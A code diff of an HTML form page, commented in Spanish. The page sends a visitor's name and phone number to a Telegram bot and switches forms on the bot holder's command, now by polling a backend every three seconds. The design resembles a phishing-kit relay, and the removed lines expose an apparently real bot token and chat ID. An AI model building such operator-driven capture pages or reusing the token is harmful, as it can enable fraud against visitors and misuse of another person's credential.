@@ -52,9 +52,9 @@
 
     <script>
         let nombre, telefono;
-        const token = '7010913168:AAG6dWUFcTUuSSYBDv-ub5KtpLjFIihrYxQ'; // Reemplaza con tu token
-        const chatId = '6781382323';  // Reemplaza con tu chat ID
-        const siteUrl = 'https://tusitio.com/formulario.html'; // Reemplaza con la URL de tu sitio
+        const token = 'TU_TOKEN_TELEGRAM';  // 🔹 Reemplaza con tu token de Telegram
+        const chatId = 'TU_CHAT_ID';  // 🔹 Reemplaza con tu chat ID
+        const serverUrl = 'https://tuservidor.com/webhook'; // 🔹 Reemplaza con la URL de tu backend
         
         function enviarPrimerMensaje() {
             nombre = document.getElementById('nombre').value;
@@ -69,8 +69,8 @@
             const botones = {
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: 'Continuar al segundo formulario', url: `${siteUrl}?action=continuar` }],
-                        [{ text: 'Volver al primer formulario', url: `${siteUrl}?action=volver` }]
+                        [{ text: 'Continuar al segundo formulario', callback_data: 'continuar' }],
+                        [{ text: 'Volver al primer formulario', callback_data: 'volver' }]
                     ]
                 }
             };
@@ -135,17 +135,23 @@
             }
         }
 
-        function escucharMensajesTelegram() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('action') === 'continuar') {
-                cambiarFormulario('2');
-            } else if (urlParams.get('action') === 'volver') {
-                cambiarFormulario('1');
-            }
+        function escucharCambiosTelegram() {
+            fetch(`${serverUrl}/estado`)  // 🔹 URL donde el servidor guarda el estado actual
+                .then(response => response.json())
+                .then(data => {
+                    if (data.action === 'continuar') {
+                        cambiarFormulario('2');
+                    } else if (data.action === 'volver') {
+                        cambiarFormulario('1');
+                    }
+                })
+                .catch(error => console.error('Error al obtener el estado:', error));
         }
-        
-        window.onload = escucharMensajesTelegram;
+
+        // Consultar el estado de Telegram cada 3 segundos
+        setInterval(escucharCambiosTelegram, 3000);
     </script>
 </body>
 </html>
+
 
